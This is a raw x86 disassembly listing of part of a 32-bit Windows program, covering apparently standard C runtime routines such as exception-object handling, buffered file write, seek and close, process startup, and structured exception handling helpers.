  42e62b:	mov    DWORD PTR [eax],0x439450
  42e631:	ret    
  42e632:	push   esi
  42e633:	push   edi
  42e634:	mov    edi,DWORD PTR [esp+0xc]
  42e638:	mov    esi,ecx
  42e63a:	mov    DWORD PTR [esi],0x439450
  42e640:	push   DWORD PTR [edi]
  42e642:	call   0x42e160
  42e647:	inc    eax
  42e648:	push   eax
  42e649:	call   0x4311fe
  42e64e:	test   eax,eax
  42e650:	pop    ecx
  42e651:	pop    ecx
  42e652:	mov    DWORD PTR [esi+0x4],eax
  42e655:	je     0x42e661
  42e657:	push   DWORD PTR [edi]
  42e659:	push   eax
  42e65a:	call   0x432780
  42e65f:	pop    ecx
  42e660:	pop    ecx
  42e661:	pop    edi
  42e662:	mov    DWORD PTR [esi+0x8],0x1
  42e669:	mov    eax,esi
  42e66b:	pop    esi
  42e66c:	ret    0x4
  42e66f:	push   esi
  42e670:	mov    esi,ecx
  42e672:	push   edi
  42e673:	mov    edi,DWORD PTR [esp+0xc]
  42e677:	mov    DWORD PTR [esi],0x439450
  42e67d:	mov    eax,DWORD PTR [edi+0x8]
  42e680:	test   eax,eax
  42e682:	mov    DWORD PTR [esi+0x8],eax
  42e685:	je     0x42e6ac
  42e687:	push   DWORD PTR [edi+0x4]
  42e68a:	call   0x42e160
  42e68f:	inc    eax
  42e690:	push   eax
  42e691:	call   0x4311fe
  42e696:	test   eax,eax
  42e698:	pop    ecx
  42e699:	pop    ecx
  42e69a:	mov    DWORD PTR [esi+0x4],eax
  42e69d:	je     0x42e6b2
  42e69f:	push   DWORD PTR [edi+0x4]
  42e6a2:	push   eax
  42e6a3:	call   0x432780
  42e6a8:	pop    ecx
  42e6a9:	pop    ecx
  42e6aa:	jmp    0x42e6b2
  42e6ac:	mov    eax,DWORD PTR [edi+0x4]
  42e6af:	mov    DWORD PTR [esi+0x4],eax
  42e6b2:	pop    edi
  42e6b3:	mov    eax,esi
  42e6b5:	pop    esi
  42e6b6:	ret    0x4
  42e6b9:	cmp    DWORD PTR [ecx+0x8],0x0
  42e6bd:	mov    DWORD PTR [ecx],0x439450
  42e6c3:	je     0x42e6ce
  42e6c5:	push   DWORD PTR [ecx+0x4]
  42e6c8:	call   0x42e0ed
  42e6cd:	pop    ecx
  42e6ce:	ret    
  42e6cf:	mov    eax,DWORD PTR [ecx+0x4]
  42e6d2:	test   eax,eax
  42e6d4:	jne    0x42e6db
  42e6d6:	mov    eax,0x439458
  42e6db:	ret    
  42e6dc:	push   esi
  42e6dd:	lea    eax,[esp+0x8]
  42e6e1:	push   eax
  42e6e2:	mov    esi,ecx
  42e6e4:	call   0x42e632
  42e6e9:	mov    DWORD PTR [esi],0x439470
  42e6ef:	mov    eax,esi
  42e6f1:	pop    esi
  42e6f2:	ret    0x4
  42e6f5:	push   esi
  42e6f6:	push   DWORD PTR [esp+0x8]
  42e6fa:	mov    esi,ecx
  42e6fc:	call   0x42e66f
  42e701:	mov    DWORD PTR [esi],0x439470
  42e707:	mov    eax,esi
  42e709:	pop    esi
  42e70a:	ret    0x4
  42e70d:	mov    DWORD PTR [ecx],0x439470
  42e713:	jmp    0x42e6b9
  42e718:	push   esi
  42e719:	mov    esi,ecx
  42e71b:	call   0x42e6b9
  42e720:	test   BYTE PTR [esp+0x8],0x1
  42e725:	je     0x42e72e
  42e727:	push   esi
  42e728:	call   0x42e750
  42e72d:	pop    ecx
  42e72e:	mov    eax,esi
  42e730:	pop    esi
  42e731:	ret    0x4
  42e734:	push   esi
  42e735:	mov    esi,ecx
  42e737:	call   0x42e70d
  42e73c:	test   BYTE PTR [esp+0x8],0x1
  42e741:	je     0x42e74a
  42e743:	push   esi
  42e744:	call   0x42e750
  42e749:	pop    ecx
  42e74a:	mov    eax,esi
  42e74c:	pop    esi
  42e74d:	ret    0x4
  42e750:	jmp    0x42e0ed
  42e755:	push   ebp
  42e756:	mov    ebp,esp
  42e758:	push   ecx
  42e759:	push   ecx
  42e75a:	mov    eax,DWORD PTR [ebp+0x8]
  42e75d:	push   ebx
  42e75e:	push   edi
  42e75f:	mov    edi,DWORD PTR [ebp+0xc]
  42e762:	imul   edi,DWORD PTR [ebp+0x10]
  42e766:	test   edi,edi
  42e768:	mov    DWORD PTR [ebp+0x8],eax
  42e76b:	mov    DWORD PTR [ebp-0x8],edi
  42e76e:	mov    ebx,edi
  42e770:	jne    0x42e779
  42e772:	xor    eax,eax
  42e774:	jmp    0x42e844
  42e779:	push   esi
  42e77a:	mov    esi,DWORD PTR [ebp+0x14]
  42e77d:	test   WORD PTR [esi+0xc],0x10c
  42e783:	je     0x42e78d
  42e785:	mov    eax,DWORD PTR [esi+0x18]
  42e788:	mov    DWORD PTR [ebp-0x4],eax
  42e78b:	jmp    0x42e794
  42e78d:	mov    DWORD PTR [ebp-0x4],0x1000
  42e794:	mov    ecx,DWORD PTR [esi+0xc]
  42e797:	and    ecx,0x108
  42e79d:	je     0x42e7c8
  42e79f:	mov    eax,DWORD PTR [esi+0x4]
  42e7a2:	test   eax,eax
  42e7a4:	je     0x42e7c8
  42e7a6:	cmp    ebx,eax
  42e7a8:	mov    edi,ebx
  42e7aa:	jb     0x42e7ae
  42e7ac:	mov    edi,eax
  42e7ae:	push   edi
  42e7af:	push   DWORD PTR [ebp+0x8]
  42e7b2:	push   DWORD PTR [esi]
  42e7b4:	call   0x42da10
  42e7b9:	sub    DWORD PTR [esi+0x4],edi
  42e7bc:	add    DWORD PTR [esi],edi
  42e7be:	add    esp,0xc
  42e7c1:	sub    ebx,edi
  42e7c3:	add    DWORD PTR [ebp+0x8],edi
  42e7c6:	jmp    0x42e80a
  42e7c8:	cmp    ebx,DWORD PTR [ebp-0x4]
  42e7cb:	jb     0x42e80f
  42e7cd:	test   ecx,ecx
  42e7cf:	je     0x42e7dc
  42e7d1:	push   esi
  42e7d2:	call   0x42e2be
  42e7d7:	test   eax,eax
  42e7d9:	pop    ecx
  42e7da:	jne    0x42e848
  42e7dc:	cmp    DWORD PTR [ebp-0x4],0x0
  42e7e0:	mov    edi,ebx
  42e7e2:	je     0x42e7ed
  42e7e4:	xor    edx,edx
  42e7e6:	mov    eax,ebx
  42e7e8:	div    DWORD PTR [ebp-0x4]
  42e7eb:	sub    edi,edx
  42e7ed:	push   edi
  42e7ee:	push   DWORD PTR [ebp+0x8]
  42e7f1:	push   DWORD PTR [esi+0x10]
  42e7f4:	call   0x43242d
  42e7f9:	add    esp,0xc
  42e7fc:	cmp    eax,0xffffffff
  42e7ff:	je     0x42e853
  42e801:	add    DWORD PTR [ebp+0x8],eax
  42e804:	sub    ebx,eax
  42e806:	cmp    eax,edi
  42e808:	jb     0x42e853
  42e80a:	mov    edi,DWORD PTR [ebp-0x8]
  42e80d:	jmp    0x42e838
  42e80f:	mov    eax,DWORD PTR [ebp+0x8]
  42e812:	movsx  eax,BYTE PTR [eax]
  42e815:	push   esi
  42e816:	push   eax
  42e817:	call   0x431398
  42e81c:	cmp    eax,0xffffffff
  42e81f:	pop    ecx
  42e820:	pop    ecx
  42e821:	je     0x42e848
  42e823:	inc    DWORD PTR [ebp+0x8]
  42e826:	mov    eax,DWORD PTR [esi+0x18]
  42e829:	dec    ebx
  42e82a:	test   eax,eax
  42e82c:	mov    DWORD PTR [ebp-0x4],eax
  42e82f:	jg     0x42e838
  42e831:	mov    DWORD PTR [ebp-0x4],0x1
  42e838:	test   ebx,ebx
  42e83a:	jne    0x42e794
  42e840:	mov    eax,DWORD PTR [ebp+0x10]
  42e843:	pop    esi
  42e844:	pop    edi
  42e845:	pop    ebx
  42e846:	leave  
  42e847:	ret    
  42e848:	mov    eax,edi
  42e84a:	sub    eax,ebx
  42e84c:	xor    edx,edx
  42e84e:	div    DWORD PTR [ebp+0xc]
  42e851:	jmp    0x42e843
  42e853:	or     DWORD PTR [esi+0xc],0x20
  42e857:	mov    eax,DWORD PTR [ebp-0x8]
  42e85a:	jmp    0x42e84a
  42e85c:	push   0xc
  42e85e:	push   0x439478
  42e863:	call   0x431210
  42e868:	push   DWORD PTR [ebp+0x14]
  42e86b:	call   0x42f3b5
  42e870:	pop    ecx
  42e871:	and    DWORD PTR [ebp-0x4],0x0
  42e875:	push   DWORD PTR [ebp+0x14]
  42e878:	push   DWORD PTR [ebp+0x10]
  42e87b:	push   DWORD PTR [ebp+0xc]
  42e87e:	push   DWORD PTR [ebp+0x8]
  42e881:	call   0x42e755
  42e886:	add    esp,0x10
  42e889:	mov    DWORD PTR [ebp-0x1c],eax
  42e88c:	or     DWORD PTR [ebp-0x4],0xffffffff
  42e890:	call   0x42e89e
  42e895:	mov    eax,DWORD PTR [ebp-0x1c]
  42e898:	call   0x43124b
  42e89d:	ret    
  42e89e:	push   DWORD PTR [ebp+0x14]
  42e8a1:	call   0x42f407
  42e8a6:	pop    ecx
  42e8a7:	ret    
  42e8a8:	push   esi
  42e8a9:	mov    esi,DWORD PTR [esp+0x8]
  42e8ad:	mov    eax,DWORD PTR [esi+0xc]
  42e8b0:	test   al,0x83
  42e8b2:	push   edi
  42e8b3:	je     0x42e926
  42e8b5:	mov    edi,DWORD PTR [esp+0x14]
  42e8b9:	test   edi,edi
  42e8bb:	je     0x42e8c7
  42e8bd:	cmp    edi,0x1
  42e8c0:	je     0x42e8c7
  42e8c2:	cmp    edi,0x2
  42e8c5:	jne    0x42e926
  42e8c7:	and    eax,0xffffffef
  42e8ca:	cmp    edi,0x1
  42e8cd:	mov    DWORD PTR [esi+0xc],eax
  42e8d0:	jne    0x42e8df
  42e8d2:	push   esi
  42e8d3:	call   0x432a1c
  42e8d8:	add    DWORD PTR [esp+0x14],eax
  42e8dc:	pop    ecx
  42e8dd:	xor    edi,edi
  42e8df:	push   esi
  42e8e0:	call   0x42e2be
  42e8e5:	mov    eax,DWORD PTR [esi+0xc]
  42e8e8:	test   al,al
  42e8ea:	pop    ecx
  42e8eb:	jns    0x42e8f5
  42e8ed:	and    eax,0xfffffffc
  42e8f0:	mov    DWORD PTR [esi+0xc],eax
  42e8f3:	jmp    0x42e909
  42e8f5:	test   al,0x1
  42e8f7:	je     0x42e909
  42e8f9:	test   al,0x8
  42e8fb:	je     0x42e909
  42e8fd:	test   ah,0x4
  42e900:	jne    0x42e909
  42e902:	mov    DWORD PTR [esi+0x18],0x200
  42e909:	push   edi
  42e90a:	push   DWORD PTR [esp+0x14]
  42e90e:	push   DWORD PTR [esi+0x10]
  42e911:	call   0x432971
  42e916:	xor    ecx,ecx
  42e918:	add    esp,0xc
  42e91b:	cmp    eax,0xffffffff
  42e91e:	setne  cl
  42e921:	dec    ecx
  42e922:	mov    eax,ecx
  42e924:	jmp    0x42e934
  42e926:	call   0x432878
  42e92b:	mov    DWORD PTR [eax],0x16
  42e931:	or     eax,0xffffffff
  42e934:	pop    edi
  42e935:	pop    esi
  42e936:	ret    
  42e937:	push   0xc
  42e939:	push   0x439488
  42e93e:	call   0x431210
  42e943:	push   DWORD PTR [ebp+0x8]
  42e946:	call   0x42f3b5
  42e94b:	pop    ecx
  42e94c:	and    DWORD PTR [ebp-0x4],0x0
  42e950:	push   DWORD PTR [ebp+0x10]
  42e953:	push   DWORD PTR [ebp+0xc]
  42e956:	push   DWORD PTR [ebp+0x8]
  42e959:	call   0x42e8a8
  42e95e:	add    esp,0xc
  42e961:	mov    DWORD PTR [ebp-0x1c],eax
  42e964:	or     DWORD PTR [ebp-0x4],0xffffffff
  42e968:	call   0x42e976
  42e96d:	mov    eax,DWORD PTR [ebp-0x1c]
  42e970:	call   0x43124b
  42e975:	ret    
  42e976:	push   DWORD PTR [ebp+0x8]
  42e979:	call   0x42f407
  42e97e:	pop    ecx
  42e97f:	ret    
  42e980:	push   0x8
  42e982:	push   0x4394a0
  42e987:	call   0x431210
  42e98c:	mov    esi,ecx
  42e98e:	mov    DWORD PTR [esi],0x439498
  42e994:	push   0xe
  42e996:	call   0x431126
  42e99b:	pop    ecx
  42e99c:	and    DWORD PTR [ebp-0x4],0x0
  42e9a0:	mov    esi,DWORD PTR [esi+0x4]
  42e9a3:	test   esi,esi
  42e9a5:	je     0x42e9ae
  42e9a7:	push   esi
  42e9a8:	call   0x42e0ed
  42e9ad:	pop    ecx
  42e9ae:	or     DWORD PTR [ebp-0x4],0xffffffff
  42e9b2:	call   0x42e9bd
  42e9b7:	call   0x43124b
  42e9bc:	ret    
  42e9bd:	push   0xe
  42e9bf:	call   0x431071
  42e9c4:	pop    ecx
  42e9c5:	ret    
  42e9c6:	push   esi
  42e9c7:	mov    esi,ecx
  42e9c9:	call   0x42e980
  42e9ce:	test   BYTE PTR [esp+0x8],0x1
  42e9d3:	je     0x42e9dc
  42e9d5:	push   esi
  42e9d6:	call   0x42e750
  42e9db:	pop    ecx
  42e9dc:	mov    eax,esi
  42e9de:	pop    esi
  42e9df:	ret    0x4
  42e9e2:	push   esi
  42e9e3:	mov    esi,DWORD PTR [esp+0x8]
  42e9e7:	push   edi
  42e9e8:	or     edi,0xffffffff
  42e9eb:	test   BYTE PTR [esi+0xc],0x83
  42e9ef:	je     0x42ea25
  42e9f1:	push   esi
  42e9f2:	call   0x42e2be
  42e9f7:	push   esi
  42e9f8:	mov    edi,eax
  42e9fa:	call   0x432754
  42e9ff:	push   DWORD PTR [esi+0x10]
  42ea02:	call   0x432c8b
  42ea07:	add    esp,0xc
  42ea0a:	test   eax,eax
  42ea0c:	jge    0x42ea13
  42ea0e:	or     edi,0xffffffff
  42ea11:	jmp    0x42ea25
  42ea13:	mov    eax,DWORD PTR [esi+0x1c]
  42ea16:	test   eax,eax
  42ea18:	je     0x42ea25
  42ea1a:	push   eax
  42ea1b:	call   0x42e0ed
  42ea20:	and    DWORD PTR [esi+0x1c],0x0
  42ea24:	pop    ecx
  42ea25:	and    DWORD PTR [esi+0xc],0x0
  42ea29:	mov    eax,edi
  42ea2b:	pop    edi
  42ea2c:	pop    esi
  42ea2d:	ret    
  42ea2e:	push   0xc
  42ea30:	push   0x4394b0
  42ea35:	call   0x431210
  42ea3a:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42ea3e:	mov    esi,DWORD PTR [ebp+0x8]
  42ea41:	test   BYTE PTR [esi+0xc],0x40
  42ea45:	je     0x42ea54
  42ea47:	and    DWORD PTR [esi+0xc],0x0
  42ea4b:	mov    eax,DWORD PTR [ebp-0x1c]
  42ea4e:	call   0x43124b
  42ea53:	ret    
  42ea54:	push   esi
  42ea55:	call   0x42f3b5
  42ea5a:	pop    ecx
  42ea5b:	and    DWORD PTR [ebp-0x4],0x0
  42ea5f:	push   esi
  42ea60:	call   0x42e9e2
  42ea65:	pop    ecx
  42ea66:	mov    DWORD PTR [ebp-0x1c],eax
  42ea69:	or     DWORD PTR [ebp-0x4],0xffffffff
  42ea6d:	call   0x42ea77
  42ea72:	jmp    0x42ea4b
  42ea74:	mov    esi,DWORD PTR [ebp+0x8]
  42ea77:	push   esi
  42ea78:	call   0x42f407
  42ea7d:	pop    ecx
  42ea7e:	ret    
  42ea7f:	cmp    DWORD PTR ds:0x43fb40,0x1
  42ea86:	jne    0x42ea8d
  42ea88:	call   0x433064
  42ea8d:	push   DWORD PTR [esp+0x4]
  42ea91:	call   0x432eed
  42ea96:	push   0xff
  42ea9b:	call   DWORD PTR ds:0x43d3e8
  42eaa1:	pop    ecx
  42eaa2:	pop    ecx
  42eaa3:	ret    
  42eaa4:	cmp    DWORD PTR ds:0x43fb40,0x1
  42eaab:	jne    0x42eab2
  42eaad:	call   0x433064
  42eab2:	push   DWORD PTR [esp+0x4]
  42eab6:	call   0x432eed
  42eabb:	push   0xff
  42eac0:	call   0x432d26
  42eac5:	pop    ecx
  42eac6:	pop    ecx
  42eac7:	ret    
  42eac8:	push   0x60
  42eaca:	push   0x4394c0
  42eacf:	call   0x431210
  42ead4:	mov    edi,0x94
  42ead9:	mov    eax,edi
  42eadb:	call   0x433bb0
  42eae0:	mov    DWORD PTR [ebp-0x18],esp
  42eae3:	mov    esi,esp
  42eae5:	mov    DWORD PTR [esi],edi
  42eae7:	push   esi
  42eae8:	call   DWORD PTR ds:0x439064
  42eaee:	mov    ecx,DWORD PTR [esi+0x10]
  42eaf1:	mov    DWORD PTR ds:0x43fcb0,ecx
  42eaf7:	mov    eax,DWORD PTR [esi+0x4]
  42eafa:	mov    ds:0x43fcbc,eax
  42eaff:	mov    edx,DWORD PTR [esi+0x8]
  42eb02:	mov    DWORD PTR ds:0x43fcc0,edx
  42eb08:	mov    esi,DWORD PTR [esi+0xc]
  42eb0b:	and    esi,0x7fff
  42eb11:	mov    DWORD PTR ds:0x43fcb4,esi
  42eb17:	cmp    ecx,0x2
  42eb1a:	je     0x42eb28
  42eb1c:	or     esi,0x8000
  42eb22:	mov    DWORD PTR ds:0x43fcb4,esi
  42eb28:	shl    eax,0x8
  42eb2b:	add    eax,edx
  42eb2d:	mov    ds:0x43fcb8,eax
  42eb32:	xor    esi,esi
  42eb34:	push   esi
  42eb35:	mov    edi,DWORD PTR ds:0x43905c
  42eb3b:	call   edi
  42eb3d:	cmp    WORD PTR [eax],0x5a4d
  42eb42:	jne    0x42eb63
  42eb44:	mov    ecx,DWORD PTR [eax+0x3c]
  42eb47:	add    ecx,eax
  42eb49:	cmp    DWORD PTR [ecx],0x4550
  42eb4f:	jne    0x42eb63
  42eb51:	movzx  eax,WORD PTR [ecx+0x18]
  42eb55:	cmp    eax,0x10b
  42eb5a:	je     0x42eb7b
  42eb5c:	cmp    eax,0x20b
  42eb61:	je     0x42eb68
  42eb63:	mov    DWORD PTR [ebp-0x1c],esi
  42eb66:	jmp    0x42eb8f
  42eb68:	cmp    DWORD PTR [ecx+0x84],0xe
  42eb6f:	jbe    0x42eb63
  42eb71:	xor    eax,eax
  42eb73:	cmp    DWORD PTR [ecx+0xf8],esi
  42eb79:	jmp    0x42eb89
  42eb7b:	cmp    DWORD PTR [ecx+0x74],0xe
  42eb7f:	jbe    0x42eb63
  42eb81:	xor    eax,eax
  42eb83:	cmp    DWORD PTR [ecx+0xe8],esi
  42eb89:	setne  al
  42eb8c:	mov    DWORD PTR [ebp-0x1c],eax
  42eb8f:	push   0x1
  42eb91:	call   0x4314cb
  42eb96:	pop    ecx
  42eb97:	test   eax,eax
  42eb99:	jne    0x42eba3
  42eb9b:	push   0x1c
  42eb9d:	call   0x42eaa4
  42eba2:	pop    ecx
  42eba3:	call   0x433ab9
  42eba8:	test   eax,eax
  42ebaa:	jne    0x42ebb4
  42ebac:	push   0x10
  42ebae:	call   0x42eaa4
  42ebb3:	pop    ecx
  42ebb4:	call   0x433853
  42ebb9:	mov    DWORD PTR [ebp-0x4],esi
  42ebbc:	call   0x433655
  42ebc1:	test   eax,eax
  42ebc3:	jge    0x42ebcd
  42ebc5:	push   0x1b
  42ebc7:	call   0x42ea7f
  42ebcc:	pop    ecx
  42ebcd:	call   DWORD PTR ds:0x439090
  42ebd3:	mov    ds:0x466264,eax
  42ebd8:	call   0x433533
  42ebdd:	mov    ds:0x43fb38,eax
  42ebe2:	call   0x433491
  42ebe7:	test   eax,eax
  42ebe9:	jge    0x42ebf3
  42ebeb:	push   0x8
  42ebed:	call   0x42ea7f
  42ebf2:	pop    ecx
  42ebf3:	call   0x43325e
  42ebf8:	test   eax,eax
  42ebfa:	jge    0x42ec04
  42ebfc:	push   0x9
  42ebfe:	call   0x42ea7f
  42ec03:	pop    ecx
  42ec04:	push   0x1
  42ec06:	call   0x432d80
  42ec0b:	pop    ecx
  42ec0c:	mov    DWORD PTR [ebp-0x28],eax
  42ec0f:	cmp    eax,esi
  42ec11:	je     0x42ec1a
  42ec13:	push   eax
  42ec14:	call   0x42ea7f
  42ec19:	pop    ecx
  42ec1a:	mov    DWORD PTR [ebp-0x44],esi
  42ec1d:	lea    eax,[ebp-0x70]
  42ec20:	push   eax
  42ec21:	call   DWORD PTR ds:0x439040
  42ec27:	call   0x433201
  42ec2c:	mov    DWORD PTR [ebp-0x20],eax
  42ec2f:	test   BYTE PTR [ebp-0x44],0x1
  42ec33:	je     0x42ec3b
  42ec35:	movzx  eax,WORD PTR [ebp-0x40]
  42ec39:	jmp    0x42ec3e
  42ec3b:	push   0xa
  42ec3d:	pop    eax
  42ec3e:	push   eax
  42ec3f:	push   DWORD PTR [ebp-0x20]
  42ec42:	push   esi
  42ec43:	push   esi
  42ec44:	call   edi
  42ec46:	push   eax
  42ec47:	call   0x42ab9d
  42ec4c:	mov    edi,eax
  42ec4e:	mov    DWORD PTR [ebp-0x2c],edi
  42ec51:	cmp    DWORD PTR [ebp-0x1c],esi
  42ec54:	jne    0x42ec5c
  42ec56:	push   edi
  42ec57:	call   0x432ead
  42ec5c:	call   0x432ecf
  42ec61:	jmp    0x42ec8e
  42ec63:	mov    eax,DWORD PTR [ebp-0x14]
  42ec66:	mov    ecx,DWORD PTR [eax]
  42ec68:	mov    ecx,DWORD PTR [ecx]
  42ec6a:	mov    DWORD PTR [ebp-0x24],ecx
  42ec6d:	push   eax
  42ec6e:	push   ecx
  42ec6f:	call   0x43309d
  42ec74:	pop    ecx
  42ec75:	pop    ecx
  42ec76:	ret    
  42ec77:	mov    esp,DWORD PTR [ebp-0x18]
  42ec7a:	mov    edi,DWORD PTR [ebp-0x24]
  42ec7d:	cmp    DWORD PTR [ebp-0x1c],0x0
  42ec81:	jne    0x42ec89
  42ec83:	push   edi
  42ec84:	call   0x432ebe
  42ec89:	call   0x432ede
  42ec8e:	or     DWORD PTR [ebp-0x4],0xffffffff
  42ec92:	mov    eax,edi
  42ec94:	lea    esp,[ebp-0x7c]
  42ec97:	call   0x43124b
  42ec9c:	ret    
  42ec9d:	push   ebp
  42ec9e:	mov    ebp,esp
  42eca0:	push   ecx
  42eca1:	push   ebx
  42eca2:	mov    eax,DWORD PTR [ebp+0xc]
  42eca5:	add    eax,0xc
  42eca8:	mov    DWORD PTR [ebp-0x4],eax
  42ecab:	mov    ebx,DWORD PTR fs:0x0
  42ecb2:	mov    eax,DWORD PTR [ebx]
  42ecb4:	mov    fs:0x0,eax
  42ecba:	mov    eax,DWORD PTR [ebp+0x8]
  42ecbd:	mov    ebx,DWORD PTR [ebp+0xc]
  42ecc0:	mov    esp,DWORD PTR [ebx-0x4]
  42ecc3:	mov    ebp,DWORD PTR [ebp-0x4]
  42ecc6:	jmp    eax
  42ecc8:	pop    ebx
  42ecc9:	leave  
  42ecca:	ret    0x8
  42eccd:	pop    eax
  42ecce:	pop    ecx
  42eccf:	xchg   DWORD PTR [esp],eax
  42ecd2:	jmp    eax
  42ecd4:	push   ebp
  42ecd5:	mov    ebp,esp
  42ecd7:	push   ecx
  42ecd8:	push   ecx
  42ecd9:	push   ebx
  42ecda:	push   esi
  42ecdb:	push   edi
  42ecdc:	mov    esi,DWORD PTR fs:0x0
  42ece3:	mov    DWORD PTR [ebp-0x4],esi
  42ece6:	mov    DWORD PTR [ebp-0x8],0x42ecfd
  42eced:	push   0x0
  42ecef:	push   DWORD PTR [ebp+0xc]
  42ecf2:	push   DWORD PTR [ebp-0x8]
  42ecf5:	push   DWORD PTR [ebp+0x8]
  42ecf8:	call   0x437f4e
  42ecfd:	mov    eax,DWORD PTR [ebp+0xc]
  42ed00:	mov    eax,DWORD PTR [eax+0x4]
  42ed03:	and    eax,0xfffffffd
  42ed06:	mov    ecx,DWORD PTR [ebp+0xc]
  42ed09:	mov    DWORD PTR [ecx+0x4],eax
  42ed0c:	mov    edi,DWORD PTR fs:0x0
  42ed13:	mov    ebx,DWORD PTR [ebp-0x4]
  42ed16:	mov    DWORD PTR [ebx],edi
  42ed18:	mov    DWORD PTR fs:0x0,ebx
  42ed1f:	pop    edi
  42ed20:	pop    esi
  42ed21:	pop    ebx
  42ed22:	leave  
  42ed23:	ret    0x8
  42ed26:	push   ebp
  42ed27:	mov    ebp,esp
  42ed29:	sub    esp,0x4
  42ed2c:	push   ebx
  42ed2d:	push   esi
  42ed2e:	push   edi
  42ed2f:	cld    
  42ed30:	mov    DWORD PTR [ebp-0x4],eax
  42ed33:	xor    eax,eax
  42ed35:	push   eax
  42ed36:	push   eax
  42ed37:	push   eax
  42ed38:	push   DWORD PTR [ebp-0x4]
  42ed3b:	push   DWORD PTR [ebp+0x14]
  42ed3e:	push   DWORD PTR [ebp+0x10]
  42ed41:	push   DWORD PTR [ebp+0xc]
  42ed44:	push   DWORD PTR [ebp+0x8]
  42ed47:	call   0x430836
  42ed4c:	add    esp,0x20
  42ed4f:	mov    DWORD PTR [ebp-0x4],eax
  42ed52:	pop    edi
  42ed53:	pop    esi
  42ed54:	pop    ebx
  42ed55:	mov    eax,DWORD PTR [ebp-0x4]
  42ed58:	mov    esp,ebp
  42ed5a:	pop    ebp
  42ed5b:	ret    
  42ed5c:	cld    
  42ed5d:	mov    eax,DWORD PTR [esp+0x8]
  42ed61:	mov    ecx,DWORD PTR [eax+0x8]
  42ed64:	cmp    ecx,DWORD PTR ds:0x43d404
  42ed6a:	je     0x42ed78
  42ed6c:	mov    eax,DWORD PTR [esp+0x4]
  42ed70:	or     DWORD PTR [eax+0x4],0x8
  42ed74:	xor    eax,eax
  42ed76:	inc    eax
  42ed77:	ret    
  42ed78:	push   0x0
  42ed7a:	push   eax
  42ed7b:	push   DWORD PTR [eax+0x14]
  42ed7e:	push   DWORD PTR [eax+0xc]
  42ed81:	push   0x0
  42ed83:	push   DWORD PTR [esp+0x20]
  42ed87:	push   DWORD PTR [eax+0x10]
  42ed8a:	push   DWORD PTR [esp+0x20]
  42ed8e:	call   0x430836
  42ed93:	add    esp,0x20
  42ed96:	ret    
  42ed97:	push   ebp
  42ed98:	mov    ebp,esp
  42ed9a:	sub    esp,0x34
  42ed9d:	push   ebx
  42ed9e:	cmp    DWORD PTR [ebp+0x8],0x123
  42eda5:	jne    0x42edb9
  42eda7:	mov    eax,0x42ee32
  42edac:	mov    ecx,DWORD PTR [ebp+0xc]
  42edaf:	mov    DWORD PTR [ecx],eax
  42edb1:	xor    eax,eax
  42edb3:	inc    eax
  42edb4:	jmp    0x42ee5b
  42edb9:	and    DWORD PTR [ebp-0x28],0x0
  42edbd:	mov    DWORD PTR [ebp-0x24],0x42ee5e
  42edc4:	mov    eax,ds:0x43d404
  42edc9:	mov    DWORD PTR [ebp-0x20],eax
  42edcc:	mov    eax,DWORD PTR [ebp+0x18]
  42edcf:	mov    DWORD PTR [ebp-0x1c],eax
  42edd2:	mov    eax,DWORD PTR [ebp+0xc]
  42edd5:	mov    DWORD PTR [ebp-0x18],eax
  42edd8:	mov    eax,DWORD PTR [ebp+0x1c]
  42eddb:	mov    DWORD PTR [ebp-0x14],eax
  42edde:	mov    eax,DWORD PTR [ebp+0x20]
  42ede1:	mov    DWORD PTR [ebp-0x10],eax
  42ede4:	and    DWORD PTR [ebp-0xc],0x0
  42ede8:	and    DWORD PTR [ebp-0x8],0x0
  42edec:	and    DWORD PTR [ebp-0x4],0x0
  42edf0:	mov    DWORD PTR [ebp-0xc],esp
  42edf3:	mov    DWORD PTR [ebp-0x8],ebp
  42edf6:	mov    eax,fs:0x0
  42edfc:	mov    DWORD PTR [ebp-0x28],eax
  42edff:	lea    eax,[ebp-0x28]
  42ee02:	mov    fs:0x0,eax
  42ee08:	mov    DWORD PTR [ebp-0x34],0x1
  42ee0f:	mov    eax,DWORD PTR [ebp+0x8]
  42ee12:	mov    DWORD PTR [ebp-0x30],eax
  42ee15:	mov    eax,DWORD PTR [ebp+0x10]
  42ee18:	mov    DWORD PTR [ebp-0x2c],eax
  42ee1b:	lea    eax,[ebp-0x30]
  42ee1e:	push   eax
  42ee1f:	mov    eax,DWORD PTR [ebp+0x8]
  42ee22:	push   DWORD PTR [eax]
  42ee24:	call   0x433901
  42ee29:	call   DWORD PTR [eax+0x74]
  42ee2c:	pop    ecx
  42ee2d:	pop    ecx
  42ee2e:	and    DWORD PTR [ebp-0x34],0x0
  42ee32:	cmp    DWORD PTR [ebp-0x4],0x0
  42ee36:	je     0x42ee4f
  42ee38:	mov    ebx,DWORD PTR fs:0x0
  42ee3f:	mov    eax,DWORD PTR [ebx]
  42ee41:	mov    ebx,DWORD PTR [ebp-0x28]
  42ee44:	mov    DWORD PTR [ebx],eax
  42ee46:	mov    DWORD PTR fs:0x0,ebx
  42ee4d:	jmp    0x42ee58
  42ee4f:	mov    eax,DWORD PTR [ebp-0x28]
  42ee52:	mov    fs:0x0,eax
  42ee58:	mov    eax,DWORD PTR [ebp-0x34]
  42ee5b:	pop    ebx
  42ee5c:	leave  
  42ee5d:	ret    
  42ee5e:	push   ebp
  42ee5f:	mov    ebp,esp
  42ee61:	push   ecx
  42ee62:	push   ebx
  42ee63:	cld    
  42ee64:	mov    eax,DWORD PTR [ebp+0xc]
  42ee67:	mov    eax,DWORD PTR [eax+0x8]
  42ee6a:	cmp    eax,DWORD PTR ds:0x43d404
  42ee70:	je     0x42ee89
  42ee72:	mov    eax,DWORD PTR [ebp+0x8]
  42ee75:	mov    eax,DWORD PTR [eax+0x4]
  42ee78:	or     eax,0x8
  42ee7b:	mov    ecx,DWORD PTR [ebp+0x8]
  42ee7e:	mov    DWORD PTR [ecx+0x4],eax
  42ee81:	xor    eax,eax
  42ee83:	inc    eax
  42ee84:	jmp    0x42ef0d
  42ee89:	mov    eax,DWORD PTR [ebp+0x8]
  42ee8c:	mov    eax,DWORD PTR [eax+0x4]
  42ee8f:	and    eax,0x66
  42ee92:	je     0x42eea3
  42ee94:	mov    eax,DWORD PTR [ebp+0xc]
  42ee97:	mov    DWORD PTR [eax+0x24],0x1
  42ee9e:	xor    eax,eax
  42eea0:	inc    eax
  42eea1:	jmp    0x42ef0d
  42eea3:	push   0x1
  42eea5:	mov    eax,DWORD PTR [ebp+0xc]
  42eea8:	push   DWORD PTR [eax+0x18]
